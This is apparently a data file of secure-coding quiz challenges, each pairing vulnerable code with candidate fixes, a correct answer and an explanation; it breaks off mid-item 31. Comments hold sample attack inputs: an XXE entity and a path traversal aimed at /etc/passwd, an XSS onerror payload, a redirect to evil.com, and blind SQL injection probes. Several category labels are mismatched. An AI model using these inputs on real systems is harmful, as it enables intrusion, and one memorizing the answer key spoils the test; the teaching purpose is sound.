

import type { SecurityFortressChallenge } from '@/lib/types';

export const securityFortressChallenges: SecurityFortressChallenge[] = [
    {
        id: '1',
        title: 'Reflected Cross-Site Scripting (XSS)',
        category: 'XSS',
        difficulty: 'Beginner',
        xp: 40,
        description: 'A search query from the URL is directly rendered into the HTML, allowing malicious scripts to be executed.',
        vulnerableCode: `// JavaScript (e.g., in a Node.js/Express app)
const urlParams = new URLSearchParams(window.location.search);
const query = urlParams.get('query');
document.getElementById('search-results').innerHTML = "You searched for: " + query;`,
        language: 'javascript',
        options: [
            {
                id: '1a',
                code: `// No change needed, browsers handle this automatically`
            },
            {
                id: '1b',
                code: `const query = urlParams.get('query');
document.getElementById('search-results').textContent = "You searched for: " + query;`
            },
            {
                id: '1c',
                code: `const query = urlParams.get('query').replace('script', '');
document.getElementById('search-results').innerHTML = "You searched for: " + query;`
            },
        ],
        correctOptionId: '1b',
        explanation: 'Using `textContent` instead of `innerHTML` ensures that the user-provided `query` is treated as plain text, not as HTML. This prevents the browser from interpreting any script tags or other malicious HTML that an attacker might inject into the URL parameter, effectively mitigating the Reflected XSS vulnerability.',
    },
    {
        id: '2',
        title: 'Basic SQL Injection',
        category: 'SQL Injection',
        difficulty: 'Beginner',
        xp: 50,
        description: 'User input is directly concatenated into a SQL query, allowing an attacker to manipulate the query structure.',
        vulnerableCode: `// Python (e.g., using a database library)
def get_user(user_id):
    query = "SELECT * FROM users WHERE id = '" + user_id + "'"
    # ... execute query ...`,
        language: 'python',
        options: [
            {
                id: '2a',
                code: `def get_user(user_id):
    query = f"SELECT * FROM users WHERE id = '{user_id}'"`
            },
            {
                id: '2b',
                code: `def get_user(user_id):
    # Use parameterized queries / prepared statements
    query = "SELECT * FROM users WHERE id = ?"
    # ... execute query with user_id as a parameter ...`
            },
            {
                id: '2c',
                code: `def get_user(user_id):
    if user_id.isalnum():
        query = "SELECT * FROM users WHERE id = '" + user_id + "'"
        # ... execute query ...`
            },
        ],
        correctOptionId: '2b',
        explanation: 'Parameterized queries (prepared statements) are the standard way to prevent SQL injection. The database treats the user input as data only, not as part of the executable SQL command.',
    },
    {
        id: '3',
        title: 'Insecure Direct Object Reference (IDOR)',
        category: 'IDOR',
        difficulty: 'Intermediate',
        xp: 60,
        description: 'An API endpoint allows a user to access a resource using its ID, but fails to check if the logged-in user is authorized to view that specific resource.',
        vulnerableCode: `// JavaScript (Node.js/Express)
app.get('/invoices/:invoiceId', (req, res) => {
  // Assume req.user contains the logged-in user's data
  const { invoiceId } = req.params;
  const invoice = db.invoices.find(invoiceId);
  res.json(invoice);
});`,
        language: 'javascript',
        options: [
            {
                id: '3a',
                code: `app.get('/invoices/:invoiceId', (req, res) => {
  const { invoiceId } = req.params;
  const invoice = db.invoices.find(invoiceId);
  // Check ownership before returning
  if (invoice.userId === req.user.id) {
    res.json(invoice);
  } else {
    res.status(403).send("Forbidden");
  }
});`
            },
            {
                id: '3b',
                code: `app.get('/invoices/:invoiceId', (req, res) => {
  const { invoiceId } = req.params;
  if (!isNaN(invoiceId)) {
    const invoice = db.invoices.find(invoiceId);
    res.json(invoice);
  } else {
     res.status(400).send("Bad Request");
  }
});`
            },
        ],
        correctOptionId: '3a',
        explanation: 'The correct fix is to perform an authorization check. After retrieving the resource, you must verify that the currently authenticated user has the right to access it.',
    },
    {
        id: '4',
        title: 'Stored Cross-Site Scripting (XSS)',
        category: 'XSS',
        difficulty: 'Intermediate',
        xp: 65,
        description: 'A user comment is saved to the database and then rendered as HTML for other users, allowing stored scripts to execute in their browsers.',
        vulnerableCode: `// PHP
$comment = $_POST['comment'];
// 1. Save $comment to the database...

// 2. Later, retrieve and display the comment:
echo "<div>" . $comment_from_db . "</div>";`,
        language: 'php',
        options: [
            {
                id: '4a',
                code: `// When displaying the comment:
echo "<div>" . htmlspecialchars($comment_from_db, ENT_QUOTES, 'UTF-8') . "</div>";`
            },
            {
                id: '4b',
                code: `// When saving the comment:
$comment = str_replace("<script>", "", $_POST['comment']);
// Save to DB...`
            },
            {
                id: '4c',
                code: `// No fix needed, modern databases prevent XSS.`
            }
        ],
        correctOptionId: '4a',
        explanation: 'The correct way to prevent XSS is to properly encode output for its context. `htmlspecialchars` converts special HTML characters (like <, >, ") into their corresponding HTML entities, so they are displayed as text instead of being interpreted as code by the browser.',
    },
    {
        id: '5',
        title: 'Command Injection',
        category: 'SQL Injection',
        difficulty: 'Advanced',
        xp: 80,
        description: 'User input is passed directly to a system shell command, allowing an attacker to execute arbitrary commands.',
        vulnerableCode: `// Python
import os
filename = request.args.get('filename')
os.system('ls -l ' + filename)`,
        language: 'python',
        options: [
            {
                id: '5a',
                code: `// Pass arguments to commands safely.
import subprocess
subprocess.run(['ls', '-l', filename])`
            },
            {
                id: '5b',
                code: `// Remove special characters like ';' and '&'
filename = filename.replace(';', '').replace('&', '')
os.system('ls -l ' + filename)`
            },
            {
                id: '5c',
                code: `// Run the command as a less privileged user.`
            }
        ],
        correctOptionId: '5a',
        explanation: 'Never pass user input directly into a shell. Use library functions that support passing arguments in an array or list, which prevents them from being interpreted as part of the command itself.',
    },
    {
        id: '6',
        title: 'Cross-Site Request Forgery (CSRF)',
        category: 'CSRF',
        difficulty: 'Advanced',
        xp: 75,
        description: 'A web application does not verify if a sensitive action (like changing an email) was intentionally triggered by the user.',
        vulnerableCode: `// JavaScript (Node.js/Express)
// Attacker tricks a logged-in user into visiting a malicious site
// which has a form that POSTs to /change-email
app.post('/change-email', (req, res) => {
  req.user.email = req.body.email;
  // No token check!
  db.save(req.user);
  res.send('Email changed!');
});`,
        language: 'javascript',
        options: [
            {
                id: '6a',
                code: `// Check the Referer header to ensure the request came from your own site.`
            },
            {
                id: '6b',
                code: `// Use a unique, unpredictable anti-CSRF token.
// 1. Generate a token and embed it in the form.
// 2. On submission, verify the token matches the one in the user's session.
if (req.session.csrfToken !== req.body.csrfToken) {
  return res.status(403).send('Invalid CSRF token');
}`
            },
            {
                id: '6c',
                code: `// Only allow the request if it is an AJAX request.`
            }
        ],
        correctOptionId: '6b',
        explanation: 'The standard defense against CSRF is the Synchronizer Token Pattern. The server provides a unique, secret token to the client, which must be included in all subsequent state-changing requests.',
    },
    {
        id: '7',
        title: 'XML External Entity (XXE) Injection',
        category: 'SQL Injection',
        difficulty: 'Advanced',
        xp: 85,
        description: 'An application parses XML input from an untrusted source, and the XML parser is configured to process external entities.',
        vulnerableCode: `// Java
// Attacker sends XML with a malicious DOCTYPE
// <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
DocumentBuilder builder = factory.newDocumentBuilder();
Document doc = builder.parse(new InputSource(new StringReader(xmlInput)));`,
        language: 'java',
        options: [
            {
                id: '7a',
                code: `// Manually search for and remove "<!DOCTYPE" from the XML string.`
            },
            {
                id: '7b',
                code: `// Disable DTDs and external entities in the XML parser.
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);`
            },
            {
                id: '7c',
                code: `// Use a different data format like JSON instead of XML.`
            }
        ],
        correctOptionId: '7b',
        explanation: 'The safest way to prevent XXE is to configure the XML parser to completely disable Document Type Definitions (DTDs) and the processing of external entities. This is the most direct and effective control.',
    },
    {
        id: '8',
        title: 'Insecure Deserialization',
        category: 'SQL Injection',
        difficulty: 'Advanced',
        xp: 90,
        description: 'An application deserializes untrusted data without sufficient validation, leading to remote code execution.',
        vulnerableCode: `// Java
// Attacker crafts a malicious serialized object
ObjectInputStream ois = new ObjectInputStream(untrustedInputStream);
MyObject obj = (MyObject) ois.readObject();`,
        language: 'java',
        options: [
            {
                id: '8a',
                code: `// Use a safe, data-only format like JSON instead of native serialization.`
            },
            {
                id: '8b',
                code: `// Implement a custom readObject method in MyObject to validate the data.`
            },
            {
                id: '8c',
                code: `// Keep the JRE and libraries updated to patch known deserialization gadgets.`
            }
        ],
        correctOptionId: '8a',
        explanation: 'Native object serialization is inherently dangerous. The most robust solution is to avoid it completely and use a human-readable, data-only format like JSON for communication.',
    },
    {
        id: '9',
        title: 'Path Traversal',
        category: 'IDOR',
        difficulty: 'Intermediate',
        xp: 65,
        description: 'User input is used to construct a file path, but special elements like `../` are not properly sanitized.',
        vulnerableCode: `// PHP
$template = $_GET['template'];
// e.g., ?template=../../../../etc/passwd
include("/var/www/templates/" . $template);`,
        language: 'php',
        options: [
            {
                id: '9a',
                code: `// Use a whitelist of allowed template names.
$allowed = ['main', 'profile', 'contact'];
if (in_array($template, $allowed)) {
    include("/var/www/templates/" . $template);
}`
            },
            {
                id: '9b',
                code: `// Strip out ".." from the input string.
$template = str_replace('../', '', $_GET['template']);`
            },
            {
                id: '9c',
                code: `// Use realpath() to resolve the path and check if it's within the allowed directory.`
            }
        ],
        correctOptionId: '9a',
        explanation: 'Blacklisting (`str_replace`) is often bypassable. The most secure method is to use a strict whitelist of allowed file or template names, ensuring no other files can be accessed.',
    },
    {
        id: '10',
        title: 'Weak Password Hashing',
        category: 'CSRF',
        difficulty: 'Intermediate',
        xp: 60,
        description: 'Passwords are hashed using a fast, unsalted algorithm like MD5 or SHA1, making them vulnerable to rainbow table and brute-force attacks.',
        vulnerableCode: `// Python
import hashlib
password = "password123"
hashed_password = hashlib.md5(password.encode()).hexdigest()`,
        language: 'python',
        options: [
            {
                id: '10a',
                code: `// Use a modern, slow, salted hashing algorithm like Argon2, scrypt, or bcrypt.
import bcrypt
salt = bcrypt.gensalt()
hashed_password = bcrypt.hashpw(password.encode(), salt)`
            },
            {
                id: '10b',
                code: `// Hash the password multiple times (e.g., 1000 rounds of SHA256).`
            },
            {
                id: '10c',
                code: `// Add a static "pepper" to the password before hashing.`
            }
        ],
        correctOptionId: '10a',
        explanation: 'Secure password storage requires a hashing algorithm that is slow by design (to resist brute-force) and uses a unique salt for each user (to resist rainbow tables). Bcrypt, scrypt, and Argon2 are the current industry standards.',
    },
    {
        id: '11',
        title: 'Unvalidated Redirects and Forwards',
        category: 'IDOR',
        difficulty: 'Intermediate',
        xp: 60,
        description: 'The application redirects to a URL specified in a parameter without validating it, allowing attackers to redirect users to malicious sites.',
        vulnerableCode: `// JavaScript (Node.js/Express)
app.get('/redirect', (req, res) => {
  const url = req.query.url;
  // e.g., ?url=http://evil.com
  res.redirect(url);
});`,
        language: 'javascript',
        options: [
            {
                id: '11a',
                code: `// Validate the URL against a whitelist of allowed domains or ensure it's a relative path.
if (isSafeUrl(url)) {
    res.redirect(url);
}`
            },
            {
                id: '11b',
                code: `// Show an intermediate page that says "You are now being redirected...".`
            },
            {
                id: '11c',
                code: `// Only redirect if the URL does not contain "http".`
            }
        ],
        correctOptionId: '11a',
        explanation: 'Never trust user input for redirection targets. The application must validate that the provided URL is safe and belongs to an expected destination, either by checking against a whitelist or by ensuring it is a relative path within the same application.',
    },
    {
        id: '12',
        title: 'Verbose Error Messages',
        category: 'CSRF',
        difficulty: 'Beginner',
        xp: 40,
        description: 'The application reveals detailed error messages (e.g., stack traces, database errors) to the user, which can leak sensitive information about the system.',
        vulnerableCode: `// Python (Flask)
@app.errorhandler(Exception)
def handle_error(e):
    # In production, this would show the user the full exception details.
    return str(e), 500`,
        language: 'python',
        options: [
            {
                id: '12a',
                code: `// In a production environment, catch the exception, log the full details for developers, and show the user a generic error message.
def handle_error(e):
    log.error(e)
    return "An internal error occurred.", 500`
            },
            {
                id: '12b',
                code: `// Wrap every function in its own try/except block.`
            },
            {
                id: '12c',
                code: `// Only show error messages to authenticated users.`
            }
        ],
        correctOptionId: '12a',
        explanation: 'Detailed error messages should never be shown to end-users in a production environment. The correct approach is to log the detailed error for debugging and present the user with a generic, non-informative error message.',
    },
    {
        id: '13',
        title: 'DOM-based XSS',
        category: 'XSS',
        difficulty: 'Advanced',
        xp: 75,
        description: 'Client-side JavaScript reads data from a user-controllable source (like `location.hash`) and passes it to an unsafe "sink" (like `eval()` or `innerHTML`).',
        vulnerableCode: `// JavaScript
// Attacker crafts URL: https://example.com#<img src=1 onerror=alert(1)>
const data = window.location.hash.substring(1);
document.getElementById('content').innerHTML = decodeURIComponent(data);`,
        language: 'javascript',
        options: [
            {
                id: '13a',
                code: `// Use a safe sink, like .textContent, to render the data as text.
document.getElementById('content').textContent = decodeURIComponent(data);`
            },
            {
                id: '13b',
                code: `// Sanitize the input before writing to innerHTML.
const sanitized = DOMPurify.sanitize(decodeURIComponent(data));
document.getElementById('content').innerHTML = sanitized;`
            },
            {
                id: '13c',
                code: 'Both A and B are valid solutions, depending on whether HTML rendering is required. A is safer if no HTML is needed.'
            }
        ],
        correctOptionId: '13c',
        explanation: 'DOM-based XSS occurs entirely on the client side. The fix is to avoid passing user-controllable data to unsafe sinks. If HTML is not needed, using `.textContent` (A) is the simplest fix. If HTML is required, it must be sanitized with a library like DOMPurify (B).',
    },
    {
        id: '14',
        title: 'Prototype Pollution',
        category: 'CSRF',
        difficulty: 'Expert',
        xp: 95,
        description: 'An attacker modifies `Object.prototype`, causing all objects in the application to inherit a malicious property.',
        vulnerableCode: `// JavaScript
function merge(target, source) {
  for (let key in source) {
    if (key === '__proto__') continue; // Incomplete check
    target[key] = source[key];
  }
}
let obj1 = {};
// Attacker sends: { "__proto__": { "isAdmin": true } }
let malicious_input = JSON.parse('{"__proto__":{"isAdmin":true}}');
merge(obj1, malicious_input);`,
        language: 'javascript',
        options: [
            {
                id: '14a',
                code: `// The best defense is to avoid unsafe recursive merge operations.
// Other defenses include freezing Object.prototype or using objects created with Object.create(null).
Object.freeze(Object.prototype);`
            },
            {
                id: '14b',
                code: `// Block the keyword "__proto__" from all user input.`
            },
            {
                id: '14c',
                code: `// Check for the constructor property as well.
if (key === '__proto__' || key === 'constructor') continue;`
            }
        ],
        correctOptionId: '14a',
        explanation: 'Prototype pollution is a subtle and dangerous vulnerability. While blacklisting properties like `__proto__` or `constructor` can help, it\'s often bypassable. The most robust defenses are to avoid unsafe recursive merge/clone functions entirely, or to proactively harden the environment by freezing `Object.prototype`.',
    },
    {
        id: '15',
        title: 'Timing Attack',
        category: 'IDOR',
        difficulty: 'Advanced',
        xp: 75,
        description: 'String comparison is not constant-time, allowing an attacker to guess a secret (like a token) character by character by measuring server response times.',
        vulnerableCode: `// Python
def check_token(provided_token, secret_token):
    # This comparison short-circuits and returns early on the first mismatch.
    if provided_token != secret_token:
        return False
    return True`,
        language: 'python',
        options: [
            {
                id: '15a',
                code: `// Use a constant-time comparison function.
import hmac
def check_token(provided_token, secret_token):
    return hmac.compare_digest(provided_token, secret_token)`
            },
            {
                id: '15b',
                code: `// Add a random delay before returning the response.`
            },
            {
                id: '15c',
                code: `// Ensure both strings have the same length before comparing.`
            }
        ],
        correctOptionId: '15a',
        explanation: 'Standard string comparison (`!=` or `==`) is not secure for cryptographic secrets because it returns as soon as it finds a mismatch. This leaks timing information. You must use a dedicated, constant-time comparison function provided by a crypto library.',
    },
    {
        id: '16',
        title: 'Insecure Randomness',
        category: 'CSRF',
        difficulty: 'Intermediate',
        xp: 55,
        description: 'The application uses a weak, predictable pseudo-random number generator (PRNG) for a security-sensitive purpose, like generating password reset tokens.',
        vulnerableCode: `// JavaScript
// Math.random() is not cryptographically secure.
function generateResetToken() {
    return Math.random().toString(36).substring(2);
}`,
        language: 'javascript',
        options: [
            {
                id: '16a',
                code: `// Use a cryptographically secure pseudo-random number generator (CSPRNG).
import { randomBytes } from 'crypto';
function generateResetToken() {
    return randomBytes(20).toString('hex');
}`
            },
            {
                id: '16b',
                code: `// Seed the random number generator with the current time.`
            },
            {
                id: '16c',
                code: `// Generate multiple tokens and pick one.`
            }
        ],
        correctOptionId: '16a',
        explanation: 'For any security-sensitive context (session IDs, tokens, etc.), you must use a cryptographically secure random number generator provided by the language or platform, such as `crypto.randomBytes` in Node.js or `secrets` in Python.',
    },
    {
        id: '17',
        title: 'Clickjacking',
        category: 'CSRF',
        difficulty: 'Intermediate',
        xp: 50,
        description: 'An attacker uses an invisible iframe to trick a user into clicking on something different from what the user perceives, potentially performing unintended actions.',
        vulnerableCode: `// Victim's site does not send an X-Frame-Options header.
// Attacker's site:
<iframe src="https://victims-site.com/delete-account" style="opacity: 0;"></iframe>
<button>Click here to win a prize!</button>`,
        language: 'generic',
        options: [
            {
                id: '17a',
                code: `// Add a 'X-Frame-Options' header to all responses to prevent the site from being embedded in an iframe.
// X-Frame-Options: DENY`
            },
            {
                id: '17b',
                code: `// Use JavaScript to detect if the site is in an iframe and break out of it.`
            },
            {
                id: '17c',
                code: `// A and B are both valid, but the header is the primary, most reliable defense.`
            }
        ],
        correctOptionId: '17c',
        explanation: 'The primary defense against clickjacking is to use the `X-Frame-Options` HTTP header (or the more modern `Content-Security-Policy: frame-ancestors`) to instruct the browser not to allow your page to be framed by other sites. Client-side script defenses (frame-busting) can be useful but are often bypassable.',
    },
    {
        id: '18',
        title: 'Insecure File Upload',
        category: 'IDOR',
        difficulty: 'Advanced',
        xp: 80,
        description: 'The application allows users to upload files but does not properly validate the file type or content, allowing an attacker to upload a web shell.',
        vulnerableCode: `// PHP
// No validation of file type, content, or extension.
$target_file = "/var/www/uploads/" . basename($_FILES["fileToUpload"]["name"]);
move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file);`,
        language: 'php',
        options: [
            {
                id: '18a',
                code: `// 1. Validate the file extension against a whitelist.
// 2. Do not trust the client-provided Content-Type header.
// 3. Generate a new, random filename for the uploaded file.
// 4. Serve uploaded files from a different domain or with a restrictive Content-Type.`
            },
            {
                id: '18b',
                code: `// Check the Content-Type header sent by the browser.`
            },
            {
                id: '18c',
                code: `// Scan the uploaded file for viruses.`
            }
        ],
        correctOptionId: '18a',
        explanation: 'Secure file uploads require multiple layers of defense. This includes validating the file extension, ignoring the client-provided MIME type, renaming the file on the server to prevent extension-based attacks (e.g., `shell.php.jpg`), and serving the files from a non-executable location.',
    },
    {
        id: '19',
        title: 'Broken Authentication - Weak Password Policy',
        category: 'CSRF',
        difficulty: 'Beginner',
        xp: 45,
        description: 'The application allows users to set extremely simple, short, or common passwords like "123456" or "password".',
        vulnerableCode: `// Conceptual - Sign-up form logic
// The server has no validation rules for the password field's strength.
// A user can register with the password "a".`,
        language: 'generic',
        options: [
            {
                id: '19a',
                code: `// Enforce a strong password policy on the server-side:
// - Minimum length (e.g., 10-12 characters)
// - Complexity requirements (mix of upper, lower, numbers, symbols)
// - Check against a list of common passwords.`
            },
            {
                id: '19b',
                code: `// Force users to change their password every 90 days.`
            },
            {
                id: '19c',
                code: `// Use multi-factor authentication (MFA).`
            }
        ],
        correctOptionId: '19a',
        explanation: 'While MFA and password rotation are good security measures, the fundamental fix is to enforce a strong password policy at the time of creation. This prevents users from choosing easily guessable passwords in the first place.',
    },
    {
        id: '20',
        title: 'Missing HttpOnly Cookie Flag',
        category: 'XSS',
        difficulty: 'Intermediate',
        xp: 55,
        description: 'A session cookie is set without the `HttpOnly` flag, allowing it to be accessed by client-side JavaScript. If an XSS vulnerability exists, an attacker can steal the session cookie.',
        vulnerableCode: `// JavaScript (Node.js/Express)
res.cookie('sessionId', 'abc12345', {
  // HttpOnly flag is missing!
});`,
        language: 'javascript',
        options: [
            {
                id: '20a',
                code: `// Always set the HttpOnly flag for session cookies.
res.cookie('sessionId', 'abc12345', {
  httpOnly: true,
  secure: true // Also important!
});`
            },
            {
                id: '20b',
                code: `// Encrypt the cookie value.`
            },
            {
                id: '20c',
                code: `// Use a shorter session timeout.`
            }
        ],
        correctOptionId: '20a',
        explanation: 'The `HttpOnly` flag instructs the browser to prevent client-side scripts from accessing the cookie. This is a critical defense-in-depth measure against session hijacking via XSS attacks.',
    },
    {
        id: '21',
        title: 'Regular Expression Denial of Service (ReDoS)',
        category: 'IDOR',
        difficulty: 'Advanced',
        xp: 85,
        description: 'A poorly written regular expression takes an extremely long time to evaluate certain inputs, leading to a denial of service.',
        vulnerableCode: `// JavaScript
// Vulnerable to "catastrophic backtracking"
const regex = /^(a+)+$/; 
// An input like "aaaaaaaaaaaaaaaaaaaaaaX" will cause the regex engine
// to hang for a very long time.`,
        language: 'javascript',
        options: [
            {
                id: '21a',
                code: `// Avoid nested quantifiers and overlapping groups in regular expressions.
// A better regex might be:
const regex = /^a+$/;`
            },
            {
                id: '21b',
                code: `// Limit the length of the input string before testing it with the regex.`
            },
            {
                id: '21c',
                code: `// Run the regex matching in a separate worker thread with a timeout.`
            }
        ],
        correctOptionId: '21a',
        explanation: 'ReDoS occurs due to "catastrophic backtracking" in certain regex patterns. The fundamental fix is to rewrite the regular expression to be more efficient and avoid problematic constructs like nested quantifiers (e.g., `(a+)+`).',
    },
    {
        id: '22',
        title: 'Insecure Content-Type Header',
        category: 'XSS',
        difficulty: 'Intermediate',
        xp: 50,
        description: 'An application allows users to upload files and serves them with a permissive Content-Type header (e.g., text/html), which could cause the browser to execute it as code.',
        vulnerableCode: `// Server responds with a user-uploaded file.
// HTTP Response Headers:
// Content-Disposition: inline
// Content-Type: text/html 
//
// The file contains: <script>alert('XSS')</script>`,
        language: 'generic',
        options: [
            {
                id: '22a',
                code: `// Set a Content-Disposition: attachment header to force a download.
// Set a restrictive Content-Type, like 'application/octet-stream'.
// Also set a 'X-Content-Type-Options: nosniff' header.`
            },
            {
                id: '22b',
                code: `// Rename the file to have a .txt extension.`
            },
            {
                id: '22c',
                code: `// Serve the file from a different domain.`
            }
        ],
        correctOptionId: '22a',
        explanation: 'To prevent the browser from interpreting a user-uploaded file, you should force it to be downloaded (`Content-Disposition: attachment`) and serve it with a generic MIME type (`application/octet-stream`). The `X-Content-Type-Options: nosniff` header prevents the browser from trying to guess the content type.',
    },
    {
        id: '23',
        title: 'Improper Asset Management',
        category: 'IDOR',
        difficulty: 'Beginner',
        xp: 40,
        description: 'An old, unmaintained version of an API (`/api/v1`) is left running in production and contains a known vulnerability that has been fixed in the current version (`/api/v2`).',
        vulnerableCode: `// Conceptual - Server routing
// Both endpoints are active:
// app.use('/api/v1', oldVulnerableRouter);
// app.use('/api/v2', newSecureRouter);`,
        language: 'generic',
        options: [
            {
                id: '23a',
                code: `// Decommission and shut down the old, unmaintained API version.
// Redirect traffic from v1 to v2 if possible.`
            },
            {
                id: '23b',
                code: `// Add a warning in the v1 API documentation.`
            },
            {
                id: '23c',
                code: `// Use a robots.txt file to hide the v1 API from search engines.`
            }
        ],
        correctOptionId: '23a',
        explanation: 'Leaving old, vulnerable, and unmonitored assets running in production is a major risk. The only way to secure them is to properly decommission them.',
    },
    {
        id: '24',
        title: 'Missing rel="noopener"',
        category: 'IDOR',
        difficulty: 'Intermediate',
        xp: 45,
        description: 'A link that opens in a new tab (`target="_blank"`) without `rel="noopener"` gives the new page partial access to the original page via the `window.opener` object, enabling phishing attacks.',
        vulnerableCode: `<a href="https://untrusted-site.com" target="_blank">Click me!</a>
// The untrusted site can now access window.opener and change its location.`,
        language: 'generic',
        options: [
            {
                id: '24a',
                code: `<a href="..." target="_blank" rel="noopener noreferrer">Click me!</a>`
            },
            {
                id: '24b',
                code: `// Don't use target="_blank". Open links in the same tab.`
            },
            {
                id: '24c',
                code: `// Use JavaScript to open the window instead.
// window.open(...)`
            }
        ],
        correctOptionId: '24a',
        explanation: 'When linking to external sites with `target="_blank"`, you must always add `rel="noopener noreferrer"`. `noopener` prevents the new page from accessing `window.opener`. `noreferrer` prevents sending the `Referer` header.',
    },
    {
        id: '25',
        title: 'Cleartext Submission of Password',
        category: 'CSRF',
        difficulty: 'Beginner',
        xp: 45,
        description: 'The login form submits the user\'s password to the server over an unencrypted HTTP connection.',
        vulnerableCode: `<!-- HTML -->
<form action="http://example.com/login" method="post">
  <input type="password" name="password">
  <button type="submit">Log In</button>
</form>`,
        language: 'generic',
        options: [
            {
                id: '25a',
                code: `// The entire site must be served over HTTPS (TLS/SSL).
// The form action should point to an https:// URL.`
            },
            {
                id: '25b',
                code: `// Hash the password on the client-side with JavaScript before submitting it.`
            },
            {
                id: '25c',
                code: `// Use a POST request instead of a GET request.`
            }
        ],
        correctOptionId: '25a',
        explanation: 'All communication between the client and server must be encrypted using HTTPS to prevent eavesdropping. Client-side hashing (B) is not a substitute for HTTPS, as an attacker can still intercept the hash and perform an offline attack.',
    },
    {
        id: '26',
        title: 'Deserialization of Untrusted Data (PHP)',
        category: 'SQL Injection',
        difficulty: 'Advanced',
        xp: 90,
        description: 'The PHP `unserialize()` function is used on user-provided data, which can lead to object injection and remote code execution.',
        vulnerableCode: `// PHP
// Attacker provides a malicious serialized string in a cookie
$data = unserialize($_COOKIE['data']);`,
        language: 'php',
        options: [
            {
                id: '26a',
                code: `// Do not use unserialize() on untrusted input. Use a safe, structured format like JSON instead.
$data = json_decode($_COOKIE['data']);`
            },
            {
                id: '26b',
                code: `// Validate the user's cookie before unserializing.`
            },
            {
                id: '26c',
                code: `// Use a firewall to block serialized payloads.`
            }
        ],
        correctOptionId: '26a',
        explanation: 'Like in other languages, native serialization in PHP is dangerous. The standard recommendation is to completely avoid `unserialize()` on any data that originates from a user, and to use a safe data interchange format like JSON instead.',
    },
    {
        id: '27',
        title: 'Open Redirect',
        category: 'IDOR',
        difficulty: 'Intermediate',
        xp: 60,
        description: 'An application redirects to a user-controlled URL without proper validation, enabling phishing attacks.',
        vulnerableCode: `// C# (ASP.NET)
public ActionResult Redirect(string returnUrl)
{
    // Attacker crafts link: /Redirect?returnUrl=http://evil-phishing-site.com
    return Redirect(returnUrl);
}`,
        language: 'generic',
        options: [
            {
                id: '27a',
                code: `// Validate the returnUrl to ensure it is a local URL within your application.
if (Url.IsLocalUrl(returnUrl))
{
    return Redirect(returnUrl);
}
return RedirectToAction("Index", "Home");`
            },
            {
                id: '27b',
                code: `// Check if the returnUrl starts with "http".`
            },
            {
                id: '27c',
                code: `// Show a warning page before redirecting.`
            }
        ],
        correctOptionId: '27a',
        explanation: 'Open redirect vulnerabilities are exploited by phishing attacks. The server must validate any user-supplied URLs to ensure they only point to pages within the same application. Most web frameworks provide a helper function (like `Url.IsLocalUrl`) for this purpose.',
    },
    {
        id: '28',
        title: 'Missing Content Security Policy (CSP)',
        category: 'XSS',
        difficulty: 'Advanced',
        xp: 70,
        description: 'The application does not set a Content Security Policy header, removing a powerful defense-in-depth layer against XSS attacks.',
        vulnerableCode: `// The application's HTTP responses do not include a Content-Security-Policy header.
// This makes it easier for an attacker to execute injected scripts.`,
        language: 'generic',
        options: [
            {
                id: '28a',
                code: `// Implement a strict CSP that whitelists trusted sources for scripts, styles, images, etc.
// Example:
Content-Security-Policy: default-src 'self'; script-src 'self' https://apis.google.com;`
            },
            {
                id: '28b',
                code: `// Rely on browser's built-in XSS filters.`
            },
            {
                id: '28c',
                code: `// Sanitize all user input perfectly, making a CSP unnecessary.`
            }
        ],
        correctOptionId: '28a',
        explanation: 'CSP is a critical defense-in-depth mechanism. While you should always sanitize input to prevent XSS, a CSP provides an additional layer of security by instructing the browser to only execute code from trusted sources, mitigating the impact of any XSS flaws that might be missed.',
    },
    {
        id: '29',
        title: 'Use of Hardcoded Credentials',
        category: 'CSRF',
        difficulty: 'Beginner',
        xp: 45,
        description: 'A password, API key, or other secret is written directly into the source code.',
        vulnerableCode: `// Java
String dbPassword = "MySuperSecretPassword123!";
Connection conn = DriverManager.getConnection(dbUrl, "admin", dbPassword);`,
        language: 'java',
        options: [
            {
                id: '29a',
                code: `// Load credentials from environment variables or a secure secret management system.
String dbPassword = System.getenv("DB_PASSWORD");`
            },
            {
                id: '29b',
                code: `// Store the password in a separate config.java file.`
            },
            {
                id: '29c',
                code: `// Encrypt the password in the code and decrypt it at runtime.`
            }
        ],
        correctOptionId: '29a',
        explanation: 'Credentials must never be hardcoded in source code. They should be managed externally using environment variables, configuration files that are not checked into source control, or a dedicated secrets management service (like AWS Secrets Manager, GCP Secret Manager, or HashiCorp Vault).',
    },
    {
        id: '30',
        title: 'Broken Access Control - Missing Role Check',
        category: 'IDOR',
        difficulty: 'Intermediate',
        xp: 60,
        description: 'An endpoint is protected by an authentication check, but fails to check if the authenticated user has the required *role* (e.g., "admin").',
        vulnerableCode: `// Python (Flask)
@app.route('/admin/dashboard')
@login_required  // Checks IF user is logged in...
def admin_dashboard():
    # ... but does NOT check if user IS AN ADMIN.
    return "Welcome to the admin panel!"`,
        language: 'python',
        options: [
            {
                id: '30a',
                code: `// Implement a role-based access control (RBAC) check.
@app.route('/admin/dashboard')
@login_required
def admin_dashboard():
    if current_user.role != 'admin':
        abort(403) // Forbidden
    return "Welcome!"`
            },
            {
                id: '30b',
                code: `// Make the URL harder to guess.
@app.route('/admin/a7c4f1/dashboard')`
            },
            {
                id: '30c',
                code: `// Log all access attempts to the admin dashboard.`
            }
        ],
        correctOptionId: '30a',
        explanation: 'Authentication (who you are) is different from authorization (what you are allowed to do). For privileged endpoints, you must check not only that a user is logged in, but also that they have the specific roles or permissions required for that action.',
    },
    {
        id: '31',
        title: 'Blind SQL Injection',
        category: 'SQL Injection',
        difficulty: 'Expert',
        xp: 95,
        description: 'The application is vulnerable to SQL injection, but the results of the query are not returned to the user. An attacker must use boolean or time-based techniques to extract data.',
        vulnerableCode: `// A tracking cookie is used in a query without parameterization.
// Attacker sets cookie to: 'xyz' AND 1=1 --
// Attacker sets cookie to: 'xyz' AND 1=2 --
// By observing the different responses (e.g., "Welcome back!" vs "Session not found"), the attacker can infer information.`,
        language: 'generic',
        options: [
            {
                id: '31a',
                code: `// The fix is the same as for regular SQL injection: Use parameterized queries (prepared statements) for all database access, even when using data that is already in your database.
query = "SELECT * FROM sessions WHERE session_id = ?"
// ... execute with the cookie value as a parameter.`
            },
            {
                id: '31b',
                code: `// Return a generic response for all outcomes to confuse the attacker.`
            },
